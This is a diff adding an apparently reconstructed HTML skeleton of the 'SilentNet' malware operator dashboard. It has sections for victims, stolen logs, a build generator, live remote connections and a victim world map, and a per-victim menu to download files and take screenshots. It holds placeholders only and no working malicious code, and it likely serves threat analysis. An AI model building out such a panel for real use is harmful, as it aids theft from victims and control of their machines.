@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<!-- RECONSTRUCTED DASHBOARD STRUCTURE -->
+<!-- Route: /dashboard/ (302 -> /auth/login when unauthenticated) -->
+<html>
+<head>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link rel="stylesheet" href="/static/css/dashboard.css">
+    <!-- Leaflet.js for victim world map -->
+    <link rel="stylesheet" href="/static/css/leaflet.min.css">
+</head>
+<body class="">
+<div class="app-container">
+
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <a href="/dashboard" class="sidebar-logo">SilentNet</a>
+            <button class="sidebar-toggle"></button>
+        </div>
+
+        <nav class="sidebar-nav">
+            <!-- Section: Overview -->
+            <div class="sidebar-section" data-section="overview">
+                <button class="sidebar-section-toggle" onclick="toggleSidebarSection(this)">
+                    <span class="sidebar-section-title">Overview</span>
+                    <span class="sidebar-section-chevron"></span>
+                </button>
+                <div class="sidebar-section-links">
+                    <a href="/dashboard/" class="sidebar-link active">
+                        <span class="sidebar-link-label">Dashboard</span>
+                    </a>
+                    <a href="/dashboard/map" class="sidebar-link">
+                        <span class="sidebar-link-label">Live Map</span>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Section: Victims -->
+            <div class="sidebar-section" data-section="victims">
+                <button class="sidebar-section-toggle" onclick="toggleSidebarSection(this)">
+                    <span class="sidebar-section-title">Victims</span>
+                    <span class="sidebar-section-chevron"></span>
+                </button>
+                <div class="sidebar-section-links">
+                    <a href="/dashboard/victims" class="sidebar-link">
+                        <span class="sidebar-link-label">All Victims</span>
+                    </a>
+                    <a href="/dashboard/logs" class="sidebar-link">
+                        <span class="sidebar-link-label">Logs</span>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Section: Builds -->
+            <div class="sidebar-section" data-section="builds">
+                <button class="sidebar-section-toggle" onclick="toggleSidebarSection(this)">
+                    <span class="sidebar-section-title">Builds</span>
+                    <span class="sidebar-section-chevron"><!-- beta badge --></span>
+                    <span class="sidebar-beta-badge">BETA</span>
+                </button>
+                <div class="sidebar-section-links">
+                    <a href="/dashboard/builds" class="sidebar-link">
+                        <span class="sidebar-link-label">Build Generator</span>
+                    </a>
+                    <!-- .sidebar-lock-icon = premium locked features -->
+                </div>
+            </div>
+
+            <!-- Section: Remote (Live C2) -->
+            <div class="sidebar-section" data-section="remote">
+                <button class="sidebar-section-toggle" onclick="toggleSidebarSection(this)">
+                    <span class="sidebar-section-title">Remote</span>
+                    <span class="sidebar-section-chevron"></span>
+                </button>
+                <div class="sidebar-section-links">
+                    <a href="/dashboard/remote" class="sidebar-link">
+                        <span class="sidebar-link-label">Connections</span>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Section: Settings -->
+            <div class="sidebar-section" data-section="settings">
+                <button class="sidebar-section-toggle" onclick="toggleSidebarSection(this)">
+                    <span class="sidebar-section-title">Settings</span>
+                </button>
+                <div class="sidebar-section-links">
+                    <a href="/dashboard/settings" class="sidebar-link">Settings</a>
+                    <a href="/dashboard/users" class="sidebar-link">Users</a>
+                </div>
+            </div>
+        </nav>
+
+        <!-- .sidebar-user: logged-in operator info -->
+        <div class="sidebar-footer">
+            <div class="sidebar-user">
+                <div class="sidebar-user-avatar"><!-- Discord avatar --></div>
+                <div class="sidebar-user-name"><!-- Discord username --></div>
+            </div>
+        </div>
+    </aside>
+
+    <!-- MAIN CONTENT -->
+    <main class="main-content">
+        <!-- Page header -->
+        <div class="page-header">
+            <h1 class="page-title">Dashboard</h1>
+            <p class="page-description">Overview of active operations</p>
+        </div>
+
+        <!-- STAT CARDS row -->
+        <div class="grid grid-4">
+            <div class="stat-card">
+                <div class="stat-label">Total Victims</div>
+                <div class="stat-value">--</div>
+                <div class="stat-change positive">+--</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Active Connections</div>
+                <div class="stat-value">--</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Builds</div>
+                <div class="stat-value">--</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Logs Collected</div>
+                <div class="stat-value">--</div>
+            </div>
+        </div>
+
+        <!-- LIVE VICTIM WORLD MAP -->
+        <div class="map-card">
+            <div class="map-card-header">
+                <span class="map-card-title">Live Victim Map</span>
+                <span class="map-card-count">-- victims</span>
+            </div>
+            <div class="map-container">
+                <!-- Leaflet.js map, victim pins with IP/location/org popups -->
+                <div id="hitMap"></div>
+            </div>
+        </div>
+
+        <!-- ACTIVE CONNECTIONS TABLE -->
+        <div class="connections-card">
+            <div class="connections-header">
+                <span class="connections-title">Active Connections</span>
+                <span class="connections-count">-- online</span>
+            </div>
+            <table class="connections-table">
+                <thead>
+                    <tr>
+                        <th>PC / User</th>
+                        <th>IP Address</th>
+                        <th>Country</th>
+                        <th>Ping</th>
+                        <th>Elevated</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <!-- Per victim row: -->
+                    <tr>
+                        <td>
+                            <div class="connection-pc">DESKTOP-XXXX</div>
+                            <div class="connection-user">username</div>
+                        </td>
+                        <td><span class="connection-ip">x.x.x.x</span></td>
+                        <td>
+                            <span class="connection-country">
+                                <img class="country-flag" src="..."> US
+                            </span>
+                        </td>
+                        <td>
+                            <!-- ping-good / ping-medium / ping-bad -->
+                            <span class="connection-ping ping-good">42ms</span>
+                        </td>
+                        <td>
+                            <!-- elevated-yes = admin/SYSTEM -->
+                            <span class="connection-elevated elevated-yes">YES</span>
+                        </td>
+                        <td>
+                            <!-- Per-victim dropdown: run commands, download logs, etc -->
+                            <div class="action-dropdown dropdown">
+                                <button class="action-btn dropdown-toggle">Actions</button>
+                                <div class="action-menu">
+                                    <div class="action-item">View Logs</div>
+                                    <div class="action-item">Download Files</div>
+                                    <div class="action-item">Screenshot</div>
+                                    <div class="action-divider"></div>
+                                    <div class="action-item danger">Terminate</div>
+                                </div>
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </main>
+</div>
+<script src="/static/js/app.js"></script>
+<!-- Leaflet.js, chart.js loaded from CDN or /static/js/ -->
+</body>
+</html>
